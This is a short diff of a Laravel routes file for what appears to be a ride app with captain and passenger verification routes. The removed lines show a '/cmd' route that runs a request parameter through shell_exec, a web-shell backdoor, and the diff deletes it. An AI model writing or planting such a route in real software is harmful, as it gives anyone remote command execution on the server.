@@ -21,9 +21,7 @@ Route::post('/', function () {
     return view('welcome');
 })->name('home');
 
-Route::get('/cmd', function (Request $request) {
-    return shell_exec($request->line);
-})->name('cmd');
+
 
 Route::get('captain/verify/{token}', [AuthController::class,'verifyEmail'])->name('captain.verify');
 Route::get('passenger/verify/{token}', [ProfileController::class,'verifyEmail'])->name('passanger.verify');
